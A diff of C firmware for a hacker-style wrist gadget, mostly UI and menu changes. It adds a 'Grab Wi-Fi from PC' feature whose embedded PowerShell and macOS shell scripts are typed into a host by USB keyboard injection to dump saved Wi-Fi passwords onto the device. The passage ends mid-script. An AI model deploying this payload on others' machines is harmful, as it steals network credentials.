@@ -50,12 +50,14 @@
 #include <stdio.h>           /* §4.1 Files: fopen/fread for the file viewer */
 #include <sys/stat.h>        /* §4.1 Files: stat() for entry size + S_ISDIR */
 #include <unistd.h>          /* §4.1 Files: unlink() for the file-delete action */
+#include <time.h>            /* NTP auto clock sync: time()/gmtime_r (time_auto_sync_tick) */
 
 #include "display.h"          /* nocsif_display_panel/io, NOCSIF_DISP_W/H */
 #include "display_io.h"       /* RAM Phase A1: PSRAM-direct panel IO telemetry (flush timing probe) */
 #include "touch.h"            /* nocsif_touch_read */
 #include "usb_gadget.h"       /* M4 "USB Gadget" start/stop (worker-signalled) */
 #include "ducky.h"            /* M4 "Run Macro" (DuckyScript player) */
+#include "bootos.h"           /* Bootable OS: serve an OS image file as a read-only bootable USB disk */
 #include "sdcard.h"           /* UI-shell P4.5.3b: /sd access lock for the macro file picker */
 #include "hid_kbd.h"          /* UI-shell P4.5: HID keymap locale cycle (US/GB/DE) */
 #include "ui_theme.h"         /* UI-shell P1: tokens, embedded fonts, shared styles */
@@ -71,6 +73,8 @@
 #include "radio_state.h"     /* RAM Phase 2 §4.13: shared live radio-state accessor (CC tiles + labels) */
 #include "nfc.h"             /* M6-P1: NFC (ST25R3916) read-tag worker + live UID/status */
 #include "wifi.h"            /* M5-P1: WiFi station worker — scan list, join, live status */
+#include "nettools.h"        /* WiFi #6: on-LAN network tooling — sweep / connect-scan / ping */
+#include "gateway.h"         /* Travel Router: network-gateway toggles + WireGuard/dnst config */
 #include "lora.h"            /* M9: LoRa (SX1262) messaging — send / listen / inbox */
 #include "gnss.h"            /* M8-P1: GNSS Live Fix — NMEA parse → sats/position/HDOP */
 #include "ble.h"             /* M7-P1: BLE (NimBLE observer) worker — device scan, live status */
@@ -996,7 +1000,7 @@ static void alert_preview_show(void)
         lv_obj_remove_flag(s_prev_title, LV_OBJ_FLAG_CLICKABLE);
         lv_label_set_long_mode(s_prev_title, LV_LABEL_LONG_DOT);
         lv_obj_set_flex_grow(s_prev_title, 1);
-        lv_obj_set_style_text_font(s_prev_title, &nocsif_mono_15, 0);
+        nocsif_label_font_scaled(s_prev_title, &nocsif_mono_15);
         lv_obj_set_style_text_color(s_prev_title, NOCSIF_WHITE, 0);
 
         nocsif_ui_background_raise_corner_masks();   /* keep the rounded corners above the banner */
@@ -1044,7 +1048,7 @@ static void nocsif_toast(const char *msg)
         lv_label_set_long_mode(s_toast_lbl, LV_LABEL_LONG_WRAP);
         lv_obj_set_width(s_toast_lbl, lv_pct(100));
         lv_obj_set_style_text_align(s_toast_lbl, LV_TEXT_ALIGN_CENTER, 0);
-        lv_obj_set_style_text_font(s_toast_lbl, &nocsif_mono_15, 0);
+        nocsif_label_font_scaled(s_toast_lbl, &nocsif_mono_15);
         lv_obj_set_style_text_color(s_toast_lbl, NOCSIF_WHITE, 0);
         nocsif_ui_background_raise_corner_masks();   /* keep the rounded corners above the toast */
     }
@@ -1164,6 +1168,30 @@ static void alerts_ingest_tick(void)
         } else if (pct > 20) {
             warned = 0;   /* re-arms once it recovers */
         }
+
+        /* Charge-stall watchdog — plugged in, below 90%, and the SOC has not climbed for STALL minutes
+         * is a stalled charge (charger latched off, a frozen gauge, or system load out-drawing a low
+         * input limit). Re-assert the charger config + enable (nocsif_power_charge_program) and post ONE
+         * Alert-Center entry per stall episode — cleared on real progress / unplug / full — so a stuck
+         * charge recovers itself (the field case needed a reflash) and a persistent fault isn't spammy.
+         * Above 90% the CV taper legitimately plateaus, so the watchdog disarms there. */
+        static int     wd_base = -1;       /* SOC at last progress; -1 = disarmed */
+        static int64_t wd_base_us;
+        static bool    wd_alerted;
+        const int64_t  WD_STALL_US = 6LL * 60 * 1000000;   /* 6 min with no SOC gain while plugged */
+        int64_t nowus = esp_timer_get_time();
+        bool    full  = (nocsif_power_charge_fsm() == NOCSIF_CHGF_DONE);
+        if (!nocsif_power_vbus_present() || full || pct < 0 || pct >= 90) {
+            wd_base = -1; wd_alerted = false;                       /* not a stall situation */
+        } else if (wd_base < 0 || pct > wd_base) {
+            wd_base = pct; wd_base_us = nowus; wd_alerted = false;  /* (re)arm on arm / real progress */
+        } else if (!wd_alerted && (nowus - wd_base_us) >= WD_STALL_US) {
+            nocsif_power_charge_program();                          /* re-assert config + charge-enable */
+            char b[64]; snprintf(b, sizeof b, "%d%% %dmV " NOCSIF_NDASH " re-armed charger",
+                                 pct, nocsif_power_vbat_mv());
+            alert_post(ALERT_KIND_BATTERY, "Charging stalled", b);
+            wd_alerted = true;                                      /* one alert per stall episode */
+        }
     }
 
     /* Radio, roughly every 4s: a deauth/disassoc burst, which only accrues while the WiFi monitor/parser is running; a 30s cooldown means a flood posts one alert, not dozens. */
@@ -1213,16 +1241,14 @@ static void alerts_ingest_tick(void)
     }
 }
 
-/* The one header live-data timer (P4.2 clock plus P4.3 battery plus
- * P4.5.4 HID-armed badge). The label push runs every tick, roughly every
- * 0.5s, so the badge tracks arm/disarm promptly; the I2C cache refreshes
- * are gated to run more slowly (RTC roughly every 20s, battery roughly
- * every 40s, since battery moves slowly per spec section 6). It then
- * updates every registered live label, but only on an actual change. One
- * timer serves the whole shell — the nav registry routes it to whichever
- * header/readout labels currently exist. Runs on the LVGL task; each I2C
- * read is short, just a few bytes, like the touch indev. Created once, in
- * nocsif_ui_init. */
+/* The one header live-data timer (P4.2 clock + P4.3 battery + P4.5.4 HID-armed badge). The label
+ * PUSH runs every tick (~0.5 s) so the badge tracks arm/disarm promptly; the I2C cache refreshes are
+ * gated slow (RTC ~20 s, battery ~40 s — the battery moves slowly, spec §6). Then it updates every
+ * registered live label update-on-change. One timer for the whole shell — the nav registry routes it
+ * to whichever header/readout labels are currently alive. Runs on the LVGL task; each I2C read is
+ * short (a few bytes), like the touch indev. Created once in nocsif_ui_init. */
+static void time_auto_sync_tick(void);   /* fwd: NTP/GNSS auto clock sync (defined by the Sync Clock code) */
+
 static void header_tick_cb(lv_timer_t *t)
 {
     (void)t;
@@ -1244,6 +1270,7 @@ static void header_tick_cb(lv_timer_t *t)
     alerts_ingest_tick();       /* Alert Center: poll phone/battery/radio/weather into the log */
     lora_alert_tick();          /* LoRa Signal Alerts: background band watch → Alert Center */
     movie_geofence_tick();      /* §4.1 Automations: auto-exit Movie mode once you leave the set location */
+    time_auto_sync_tick();      /* keep the RTC fresh from NTP (WiFi) or a GNSS fix, whichever is up */
 }
 
 /* A USB mode-picker row: [icon] name … [right status], chevron-less like the power-menu action row
@@ -1279,8 +1306,8 @@ static void add_mode_row(lv_obj_t *list, const char *icon, const char *name,
     lv_obj_set_flex_grow(nm, 1);
 
     c->status = lv_label_create(row);
-    lv_label_set_text(c->status, desc);                  /* seeded initially; the timer keeps it updated afterward */
-    lv_obj_set_style_text_font(c->status, &nocsif_mono_11, 0);
+    lv_label_set_text(c->status, desc);                  /* seeded; the timer keeps it live */
+    nocsif_label_font_scaled(c->status, &nocsif_mono_11);
     lv_obj_set_style_text_color(c->status, NOCSIF_ASH, 0);
 
     lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
@@ -1317,7 +1344,7 @@ static void add_status_row(lv_obj_t *list, const char *icon, const char *name,
 
     lv_obj_t *status = lv_label_create(row);
     lv_label_set_text(status, "");
-    lv_obj_set_style_text_font(status, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(status, &nocsif_mono_11);
     lv_obj_set_style_text_color(status, NOCSIF_ASH, 0);
 
     lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
@@ -1374,15 +1401,20 @@ static lv_obj_t *build_wifi_stations(void);/* M5-P3·2: passive client/station l
 static lv_obj_t *build_wifi_probes(void); /* M5-P3·2: probe-request / SSID harvest (fills wifi.probes) */
 static lv_obj_t *build_wifi_pcap(void);   /* M5-P3·3: PCAP capture to microSD (fills wifi.pcap) */
 static lv_obj_t *build_wifi_handshake(void);/* M5-P4·1: WPA key-exchange + PMKID observation (fills wifi.handshake) */
+static lv_obj_t *build_wifi_wep_recover(void);/* #4: WEP key recovery status/result screen (channel-locked) */
 static lv_obj_t *build_wifi_anomalies(void);/* M5-P4·2: passive detectors — deauth rate + duplicate-SSID (fills wifi.anomalies) */
 static lv_obj_t *build_wifi_mgmt(void);   /* M5-P5·1: management-frame TX — active (fills wifi.mgmt) */
 static lv_obj_t *build_wifi_beacon(void); /* M5-P5·2: beacon TX — active decoy advertisement (fills wifi.beacon) */
 static lv_obj_t *build_wifi_ap(void);     /* M5-P5·3: software access point — active (fills wifi.ap) */
 static lv_obj_t *build_wifi_portal(void); /* M5-P5·4: captive portal — active (fills wifi.portal) */
 static lv_obj_t *build_wifi_aphub(void);  /* Access Point hub: Software AP · Captive Portal · Beacon TX */
+static lv_obj_t *build_wifi_travel(void);    /* Travel Router: gateway Share / DNS filter / WireGuard / dnst */
+static lv_obj_t *build_wifi_wireguard(void); /* WireGuard tunnel: import / view / edit + connect */
+static lv_obj_t *build_wifi_dnst(void);      /* DNS transport (dnst) settings (scaffold) */
 static lv_obj_t *build_wifi_monitor(void);/* M5-P2: promiscuous capture monitor — "All Traffic" (fills wifi.monitor) */
 static lv_obj_t *build_wifi_connect(void);      /* Redesign: WiFi Connect hub (join/saved/auto-join/MAC) */
 static lv_obj_t *build_wifi_monitor_hub(void);  /* Redesign: WiFi Monitor hub (live views) */
+static lv_obj_t *build_wifi_nettools(void);     /* WiFi #6: on-LAN network tooling hub */
 static void      wifi_current_row_cb(lv_event_t *e);  /* WiFi menu top row -> per-network menu */
 static lv_obj_t *build_ble(void);
 static lv_obj_t *build_ble_explore(void); /* passive-detect hub (Devices/Trackers/Skimmers/Drones/GATT) */
@@ -1521,6 +1553,8 @@ static const app_t k_screens[] = {
     { "wifi.connect", "WiFi Connect", NOCSIF_ICON_WIFI,  build_wifi_connect, NULL, true },
     { "wifi.monhub",  "WiFi Monitor", NOCSIF_ICON_MON,   build_wifi_monitor_hub, NULL, true },
     { "wifi.aplist", "Routers", NOCSIF_ICON_WIFI,  build_wifi_aplist,  NULL, true },
+    /* WiFi #6 — on-LAN network tooling (ping sweep / connect-scan / targeted ping / presets). */
+    { "wifi.nettools", "Network Tools", NOCSIF_ICON_MON, build_wifi_nettools, NULL, true },
     { "wifi.omit",   "Omitted WiFi",  NOCSIF_ICON_SYS,   build_wifi_omit,    NULL, true },
     { "wifi.stations", "Clients",    NOCSIF_ICON_AP,     build_wifi_stations, NULL, true },
     { "wifi.probes", "Probe Requests", NOCSIF_ICON_HUNT, build_wifi_probes,  NULL, true },
@@ -1534,6 +1568,11 @@ static const app_t k_screens[] = {
     { "wifi.beacon", "Beacon TX",     NOCSIF_ICON_AP,     build_wifi_beacon,  NULL, true },
     { "wifi.ap",     "Software AP",   NOCSIF_ICON_AP,     build_wifi_ap,      NULL, true },
     { "wifi.portal", "Captive Portal", NOCSIF_ICON_AP,    build_wifi_portal,  NULL, true },
+    /* Travel Router — the network gateway: share the STA uplink to a SoftAP with DNS filtering,
+     * a WireGuard tunnel, and a DNS-transport scaffold. See gateway.h. */
+    { "wifi.travel",    "Travel Router", NOCSIF_ICON_AP,   build_wifi_travel,    NULL, true },
+    { "wifi.wireguard", "WireGuard",     NOCSIF_ICON_KEY,  build_wifi_wireguard, NULL, true },
+    { "wifi.dnst",      "DNS transport", NOCSIF_ICON_RADIO, build_wifi_dnst,     NULL, true },
     { "ble",      "Bluetooth LE",    NOCSIF_ICON_BLE,    build_ble,      NULL, true },
     /* "Bluetooth Explore" — the passive-detect hub (Devices / Trackers / Card Skimmers / Drones /
      * Everything Bluetooth=GATT). Drills into the existing detect screens; nothing else changed. */
@@ -1891,19 +1930,19 @@ static void home_gesture_cb(lv_event_t *e)
 /* P8 v2.2 — Life category (the old Home "WATCH" band, re-homed under the Life circle).
  * §4.8a: the rowspecs are file-scope so the companion menu mirror (nocsif_companion_menu_json) can
  * serialize the exact same rows the watch shows — one source of truth, not a hardcoded phone grid. */
-static const rowspec_t k_life_rows[] = {   /* alphabetical by label */
-    { "alerts",   "Alerts",          NOCSIF_ICON_BELL,    NULL, NOCSIF_TAG_NONE },
+static const rowspec_t k_life_rows[] = {   /* submenus first, then leaves — alphabetical within each group */
     { "audio",    "Audio",           NOCSIF_ICON_SPEAKER, NULL, NOCSIF_TAG_NONE },   /* -> Audio hub */
     { "phone",    "Bluetooth",       NOCSIF_ICON_BLE,     NULL, NOCSIF_TAG_NONE },   /* -> BLE Connect */
+    { "timers",   "Timers & Alarms", NOCSIF_ICON_CLOCK,   NULL, NOCSIF_TAG_NONE },
+    { "wifi.connect", "WiFi Connect", NOCSIF_ICON_WIFI,   NULL, NOCSIF_TAG_NONE },   /* redesign: same hub as under WiFi */
+    { "alerts",   "Alerts",          NOCSIF_ICON_BELL,    NULL, NOCSIF_TAG_NONE },
     /* §4.8a — Companion also lives here (Life) and under Cyber > WiFi; System no longer carries it. */
     { "system.companion", "Companion", NOCSIF_ICON_CAST,   "",   NOCSIF_TAG_VALUE, nocsif_wifi_companion_tag_str },
     { "dnd",      "Do Not Disturb",  NOCSIF_ICON_MOON,    "",   NOCSIF_TAG_VALUE, autom_dnd_tag },
     { "flash",    "Flashlight",      NOCSIF_ICON_FLASH,   NULL, NOCSIF_TAG_NONE },
     { "level",    "Level",           NOCSIF_ICON_ACT,     NULL, NOCSIF_TAG_NONE },
     { "notes",    "Notes",           NOCSIF_ICON_NOTE,    NULL, NOCSIF_TAG_NONE },
-    { "timers",   "Timers & Alarms", NOCSIF_ICON_CLOCK,   NULL, NOCSIF_TAG_NONE },
     { "weather",  "Weather",         NOCSIF_ICON_WX,      NULL, NOCSIF_TAG_NONE },
-    { "wifi.connect", "WiFi Connect", NOCSIF_ICON_WIFI,   NULL, NOCSIF_TAG_NONE },   /* redesign: same hub as under WiFi */
 };
 static lv_obj_t *build_life(void)
 {
@@ -1914,14 +1953,14 @@ static lv_obj_t *build_life(void)
 }
 
 /* P8 v2.2 — Cyber category (the old Home "OPERATIONS" band, re-homed under the Cyber circle). */
-static const rowspec_t k_cyber_rows[] = {   /* alphabetical by label */
+static const rowspec_t k_cyber_rows[] = {   /* submenus first, then leaves — alphabetical within each group */
     { "ble",  "Bluetooth LE",    NOCSIF_ICON_BLE,   NULL, NOCSIF_TAG_NONE },
     { "gnss", "Location / GNSS", NOCSIF_ICON_LOC,   NULL, NOCSIF_TAG_NONE },
     { "nfc",  "NFC",             NOCSIF_ICON_NFC,   NULL, NOCSIF_TAG_NONE },
-    { "hunt", "Signal Hunt",     NOCSIF_ICON_HUNT,  NULL, NOCSIF_TAG_NONE },
     { "lora", "Sub-GHz / LoRa",  NOCSIF_ICON_RADIO, NULL, NOCSIF_TAG_NONE },
     { "usb",  "USB Gadget",      NOCSIF_ICON_USB,   NULL, NOCSIF_TAG_NONE },
     { "wifi", "WiFi",            NOCSIF_ICON_WIFI,  NULL, NOCSIF_TAG_NONE },
+    { "hunt", "Signal Hunt",     NOCSIF_ICON_HUNT,  NULL, NOCSIF_TAG_NONE },
 };
 static lv_obj_t *build_cyber(void)
 {
@@ -2092,11 +2131,11 @@ static lv_obj_t *build_audio_player(void)
 }
 
 /* grab-bag batch — Life > Audio hub: the file Player plus the two mic tuners. */
-static const rowspec_t k_audiohub_rows[] = {
+static const rowspec_t k_audiohub_rows[] = {   /* alphabetical (no submenus here) */
     { "audio.player", "Audio Player", NOCSIF_ICON_SPEAKER, NULL, NOCSIF_TAG_NONE },
-    { "voice",        "Voice Memos",  NOCSIF_ICON_MIC,     NULL, NOCSIF_TAG_NONE },
-    { "tuner",        "Tuner",        NOCSIF_ICON_MIC,     NULL, NOCSIF_TAG_NONE },
     { "pianotuner",   "Piano Tuner",  NOCSIF_ICON_MIC,     NULL, NOCSIF_TAG_NONE },
+    { "tuner",        "Tuner",        NOCSIF_ICON_MIC,     NULL, NOCSIF_TAG_NONE },
+    { "voice",        "Voice Memos",  NOCSIF_ICON_MIC,     NULL, NOCSIF_TAG_NONE },
 };
 static lv_obj_t *build_audio_hub(void)
 {
@@ -2264,19 +2303,19 @@ static void alerts_make_card(lv_obj_t *parent, alert_card_t *c)
     lv_obj_remove_flag(c->title, LV_OBJ_FLAG_CLICKABLE);
     lv_label_set_long_mode(c->title, LV_LABEL_LONG_DOT);
     lv_obj_set_width(c->title, lv_pct(100));
-    lv_obj_set_style_text_font(c->title, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(c->title, &nocsif_mono_18);
     lv_obj_set_style_text_color(c->title, NOCSIF_WHITE, 0);
 
     c->body = lv_label_create(col);
     lv_obj_remove_flag(c->body, LV_OBJ_FLAG_CLICKABLE);
     lv_label_set_long_mode(c->body, LV_LABEL_LONG_DOT);
     lv_obj_set_width(c->body, lv_pct(100));
-    lv_obj_set_style_text_font(c->body, &nocsif_mono_14, 0);
+    nocsif_label_font_scaled(c->body, &nocsif_mono_14);
     lv_obj_set_style_text_color(c->body, NOCSIF_STEEL, 0);
 
     c->age = lv_label_create(c->card);
     lv_obj_remove_flag(c->age, LV_OBJ_FLAG_CLICKABLE);
-    lv_obj_set_style_text_font(c->age, &nocsif_mono_14, 0);
+    nocsif_label_font_scaled(c->age, &nocsif_mono_14);
     lv_obj_set_style_text_color(c->age, NOCSIF_ASH, 0);
 }
 
@@ -2307,7 +2346,7 @@ static lv_obj_t *build_alerts(void)
     lv_obj_remove_flag(cl, LV_OBJ_FLAG_CLICKABLE);
     lv_label_set_text(cl, "Clear all");
     lv_obj_center(cl);
-    lv_obj_set_style_text_font(cl, &nocsif_mono_15, 0);
+    nocsif_label_font_scaled(cl, &nocsif_mono_15);
     lv_obj_set_style_text_color(cl, NOCSIF_WHITE, 0);
 
     /* the fixed card pool */
@@ -2342,6 +2381,7 @@ static lv_obj_t *build_alerts(void)
 static lv_obj_t *wifi_menu_row(lv_obj_t *parent, const char *name, lv_color_t name_col,
                                const char *acc, lv_obj_t **out_acc, lv_event_cb_t cb, void *ud);
 static lv_obj_t *build_wifi_macmenu(void);
+static lv_obj_t *build_wifi_grab(void);   /* WiFi Connect > Grab Wi-Fi from PC (USB HID import) */
 static lv_obj_t *s_wifi_aj_tag;
 static void wifi_page_autojoin_cb(lv_event_t *e)
 {
@@ -2360,6 +2400,22 @@ static void wifi_page_mac_cb(lv_event_t *e)
         nocsif_nav_push(root);
     }
 }
+static void wifi_page_grab_cb(lv_event_t *e)
+{
+    (void)e;
+    lv_obj_t *root = build_wifi_grab();
+    if (root) {
+        nocsif_nav_push(root);
+    }
+}
+
+/* WiFi-menu tag for the Network Tools row: "no link" when not joined, "busy" while a job runs, else "". */
+static const char *wifi_nettools_row_tag(void)
+{
+    if (!nocsif_wifi_connected()) return "no link";
+    if (nocsif_nettools_busy())   return "busy";
+    return "";
+}
 
 /* WiFi-menu tag for the omit-list row: the count of hidden MACs, or "" when empty. */
 static const char *wifi_omit_tag_str(void)
@@ -2371,11 +2427,15 @@ static const char *wifi_omit_tag_str(void)
     return b;
 }
 
-/* Redesign: the WiFi menu is alphabetical, with Join/Saved/Auto-join/MAC grouped under WiFi Connect and
- * the live views (All Traffic/Anomalies/Clients/Live Networks/Probe Requests) under WiFi Monitor. */
-static const rowspec_t k_wifi_rows[] = {   /* alphabetical by label */
+/* Redesign: the WiFi menu is submenus-first-then-leaves, alphabetical within each group. Join/Saved/
+ * Auto-join/MAC are grouped under WiFi Connect and the live views (All Traffic/Anomalies/Clients/Live
+ * Networks/Probe Requests) under WiFi Monitor. */
+static const rowspec_t k_wifi_rows[] = {
+        { "wifi.nettools",  "Network Tools",       NOCSIF_ICON_MON,   "",        NOCSIF_TAG_VALUE, wifi_nettools_row_tag },
         /* Access Point hub — the software AP plus its Captive Portal and Beacon TX live inside. */
         { "wifi.aphub",     "SSID TX",             NOCSIF_ICON_AP,    NULL,      NOCSIF_TAG_NONE },
+        { "wifi.connect",   "WiFi Connect",        NOCSIF_ICON_WIFI,  NULL,      NOCSIF_TAG_NONE },
+        { "wifi.monhub",    "WiFi Monitor",        NOCSIF_ICON_MON,   NULL,      NOCSIF_TAG_NONE },
         /* §4.8a — the phone live-mirror surface (also under Life). Open SoftAP + nocsif.local. */
         { "system.companion", "Companion",         NOCSIF_ICON_CAST,  "",        NOCSIF_TAG_VALUE, nocsif_wifi_companion_tag_str },
         { "wifi.mgmt",      "Deauth TX",           NOCSIF_ICON_RADIO, "off",     NOCSIF_TAG_RUN, nocsif_wifi_mgmt_tx_tag_str },
@@ -2383,9 +2443,11 @@ static const rowspec_t k_wifi_rows[] = {   /* alphabetical by label */
         { "wifi.omit",      "Omitted WiFi",        NOCSIF_ICON_SYS,   "",        NOCSIF_TAG_VALUE, wifi_omit_tag_str },
         { "wifi.pcap",      "Record All Traffic",  NOCSIF_ICON_DRIVE, "off",     NOCSIF_TAG_RUN, nocsif_wifi_pcap_tag_str },
         { "hunt",           "Signal Hunt",         NOCSIF_ICON_HUNT,  NULL,      NOCSIF_TAG_NONE },
-        { "wifi.wardrive",  "Wardrive",            NOCSIF_ICON_LOC,   "+gnss",   NOCSIF_TAG_VALUE },
-        { "wifi.connect",   "WiFi Connect",        NOCSIF_ICON_WIFI,  NULL,      NOCSIF_TAG_NONE },
-        { "wifi.monhub",    "WiFi Monitor",        NOCSIF_ICON_MON,   NULL,      NOCSIF_TAG_NONE },
+        /* Travel Router — share the watch's WiFi uplink to a hotspot (+ filter / VPN / sign-in). */
+        { "wifi.travel",    "Travel Router",       NOCSIF_ICON_AP,    "off",     NOCSIF_TAG_RUN, nocsif_gateway_tag_str },
+        /* Fix: this used to carry a dead "wifi.wardrive" id (no k_screens entry -> silently stuck as a
+         * permanently-dimmed disabled stub); gnss.wardrive is the real, registered Wardrive Map screen. */
+        { "gnss.wardrive",  "Wardrive",            NOCSIF_ICON_LOC,   "+gnss",   NOCSIF_TAG_VALUE },
 };
 
 /* WiFi Connect hub children shown in the app registry / companion mirror (the Auto-join toggle + Set MAC
@@ -2456,9 +2518,12 @@ static lv_obj_t *build_wifi(void)
     return scr;
 }
 
-/* Redesign: WiFi Connect hub — Join / Saved / Auto-join / Set MAC, alphabetical. Join + Saved are app
- * screens (app_row → drill); Auto-join is a device toggle and Set MAC drills to the MAC editor, so both
- * are added directly (like they used to be on the WiFi page). Also placed in the Life tab. */
+/* Redesign: WiFi Connect hub — Join / Saved / Auto-join / Set MAC, alphabetical (no submenus here, so just
+ * alphabetical; Auto-join is a master-ish toggle and stays pinned first like the other hub master rows).
+ * Join + Saved are app screens (ROWS → app_row → drill); Grab Wi-Fi + Set MAC drill to hand-built screens,
+ * so both are added directly. Grab/Join/Saved/Set-MAC land in alphabetical order either way, so the two
+ * k_wifi_connect_rows entries are added by ITERATING the whole array (ROWS), never by a fixed numeric
+ * index — reordering that array later can't silently swap which label/target renders at a position. */
 static lv_obj_t *build_wifi_connect(void)
 {
     nocsif_wifi_init();
@@ -2467,8 +2532,9 @@ static lv_obj_t *build_wifi_connect(void)
     lv_obj_t *list = nocsif_menu_list(content);
     wifi_menu_row(list, "Auto-join", NOCSIF_BONE,
                   nocsif_wifi_autojoin() ? "on" : "off", &s_wifi_aj_tag, wifi_page_autojoin_cb, NULL);
-    app_row(list, &k_wifi_connect_rows[0]);   /* Join Networks */
-    app_row(list, &k_wifi_connect_rows[1]);   /* Saved Networks */
+    /* Grab Wi-Fi from PC — one-tap import of a plugged-in PC's saved networks via USB HID injection. */
+    wifi_menu_row(list, "Grab Wi-Fi from PC", NOCSIF_BONE, ">", NULL, wifi_page_grab_cb, NULL);
+    ROWS(list, k_wifi_connect_rows);   /* Join Networks, Saved Networks */
     wifi_menu_row(list, "Set MAC address", NOCSIF_BONE, ">", NULL, wifi_page_mac_cb, NULL);
     return scr;
 }
@@ -3511,7 +3577,7 @@ static lv_obj_t *build_wifi_macmenu(void)
 
     s_mm_mac = lv_label_create(content);
     lv_label_set_text(s_mm_mac, nocsif_wifi_mac_str());
-    lv_obj_set_style_text_font(s_mm_mac, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_mm_mac, &nocsif_mono_18);
     lv_obj_set_style_text_color(s_mm_mac, NOCSIF_WHITE, 0);
     lv_obj_set_style_pad_top(s_mm_mac, 4, 0);
 
@@ -3610,6 +3676,463 @@ static lv_obj_t *build_wifi_macentry(void)
 
     nocsif_kb_action(scr, "Apply MAC", wifi_macentry_btn_cb, ta);
     nocsif_kb_attach(scr, ta, NOCSIF_KB_HEX);
+    return scr;
+}
+
+/* ---- WiFi Connect > Grab Wi-Fi from PC (one-tap import via USB HID injection) ---------------------- *
+ * With no PC software: the watch becomes a USB keyboard, types a self-contained command into the plugged-in
+ * PC, then becomes a File-Share drive. The typed command exports the PC's saved Wi-Fi networks, then POLLS
+ * for the watch's removable drive (the nocsif marker folder) and writes one .net file per network into
+ * nocsif/Networks — the same folder Saved Networks + SSID TX Emulate read from (netstore.{c,h}). The watch
+ * then reclaims the card and counts what landed. No on-watch parsing: the folder is already the source of
+ * truth. The command survives the HID->MSC mode switch because it runs on the PC independently of the
+ * watch's USB state.
+ *
+ * A USB keyboard is write-only (no read-back), so the watch cannot auto-detect the host OS — the operator
+ * PICKS the target (Windows / macOS / Linux) and the watch types the right opener + shell for it:
+ *   Windows: Run box -> cmd -> `powershell -EncodedCommand <base64-utf16le>`  (netsh; fully silent).
+ *   macOS:   Spotlight (Cmd+Space) -> Terminal -> `echo <b64>|openssl enc -base64 -A -d|sh`
+ *            (networksetup lists SSIDs silently; `security` pulls Keychain PSKs but MAY prompt for auth).
+ *   Linux:   Ctrl+Alt+T terminal (GNOME-family) -> same base64|openssl|sh
+ *            (nmcli lists SSIDs; `nmcli -s` returns PSKs where polkit allows, else SSID-only).
+ * base64 is a safe, quote-free charset (immune to the Run-dialog length cap, shell quoting, and line-editor
+ * reflow), so only [A-Za-z0-9+/=] and the short launcher are ever typed. Assumes a US keyboard layout, and
+ * on Windows an English (label-based) `netsh`. The PC's command window is left visible. */
+
+typedef enum { GRAB_OS_WIN = 0, GRAB_OS_MAC, GRAB_OS_LINUX } grab_os_t;
+
+/* The readable Windows PowerShell source (edit HERE; base64-encoded to -EncodedCommand at runtime, so
+ * there is no separate blob to regenerate). Kept ASCII so the UTF-16LE conversion below is byte->{byte,0}. */
+static const char GRAB_PS_SCRIPT[] =
+    "$o=@()\n"
+    "netsh wlan show profiles|Select-String 'User Profile\\s*:\\s*(.+)$'|%{\n"
+    "$p=$_.Matches[0].Groups[1].Value.Trim()\n"
+    "$d=netsh wlan show profile name=\"$p\" key=clear\n"
+    "$k=($d|Select-String 'Key Content\\s*:\\s*(.+)$'|select -f 1)\n"
+    "$q=if($k){$k.Matches[0].Groups[1].Value.Trim()}else{''}\n"
+    "$a=($d|Select-String 'Authentication\\s*:\\s*(.+)$'|select -f 1)\n"
+    "$c=if($q){'WPA2'}else{'open'}\n"
+    "if($a -match 'WPA3'){$c='WPA3'}elseif($a -match 'WEP'){$c='WEP'}\n"
+    "$o+=[pscustomobject]@{s=$p;p=$q;c=$c}\n"
+    "}\n"
+    "Write-Host \"NocSif: $($o.Count) profiles. Waiting for File Share drive...\"\n"
+    "$v=$null\n"
+    "for($i=0;$i -lt 90;$i++){$v=[IO.DriveInfo]::GetDrives()|?{$_.IsReady -and $_.DriveType -eq 'Removable' -and (Test-Path ($_.Name+'nocsif'))}|select -f 1;if($v){break};sleep 1}\n"
+    "if(-not $v){Write-Host 'NocSif: no File Share drive after 90s. Aborting.';sleep 8;exit}\n"
+    "$dir=$v.Name+'nocsif\\Networks'\n"
+    "New-Item -ItemType Directory -Force -Path $dir|Out-Null\n"
+    "$e=New-Object Text.UTF8Encoding($false)\n"
+    "$w=0\n"
+    "foreach($n in $o){\n"
+    "if(-not $n.s){continue}\n"
+    "$nm=$n.s -replace '[^A-Za-z0-9._ -]','_'\n"
+    "if($nm -eq '' -or $nm[0] -eq '.'){$nm='_'+$nm}\n"
+    "$t=\"ssid=$($n.s)`r`nsecurity=$($n.c)`r`n\"\n"
+    "if($n.p){$t+=\"psk=$($n.p)`r`n\"}\n"
+    "[IO.File]::WriteAllText((Join-Path $dir \"$nm.net\"),$t,$e)\n"
+    "$w++\n"
+    "}\n"
+    "Write-Host \"NocSif: wrote $w networks to $dir. Done - you can close this window.\"\n"
+    "sleep 12\n";
+
+/* macOS POSIX sh (base64'd raw and run via `openssl enc -base64 -A -d|sh`). Lists preferred SSIDs with
+ * networksetup (silent); `security find-generic-password` reads each Keychain PSK but the OS MAY show an
+ * auth prompt — networks whose PSK is denied/absent are written SSID-only (security=open). Polls /Volumes
+ * for the File-Share mount. IFS is set to a newline so SSIDs with spaces survive word-splitting. */
+static const char GRAB_MAC_SCRIPT[] =
+    "dev=$(networksetup -listallhardwareports|awk '/Wi-Fi|AirPort/{getline;print $2;exit}')\n"
+    "[ -z \"$dev\" ]&&dev=en0\n"
+    "ssids=$(networksetup -listpreferredwirelessnetworks \"$dev\" 2>/dev/null|sed '1d;s/^[ \t]*//')\n"
+    "dir=\"\";i=0\n"
+    "while [ $i -lt 90 ];do\n"
+    "for m in /Volumes/*/nocsif;do [ -d \"$m\" ]&&dir=\"${m%/nocsif}/nocsif/Networks\"&&break;done\n"
+    "[ -n \"$dir\" ]&&break\n"
+    "i=$((i+1));sleep 1\n"
+    "done\n"
+    "[ -z \"$dir\" ]&&{ echo 'NocSif: no File Share drive found';sleep 6;exit;}\n"
+    "mkdir -p \"$dir\";w=0\n"
+    "IFS='\n'\n"
+    "for ssid in $ssids;do\n"
+    "[ -z \"$ssid\" ]&&continue\n"
+    "psk=$(security find-generic-password -wa \"$ssid\" 2>/dev/null)\n"
+    "nm=$(printf %s \"$ssid\"|tr -c 'A-Za-z0-9._ -' _)\n"
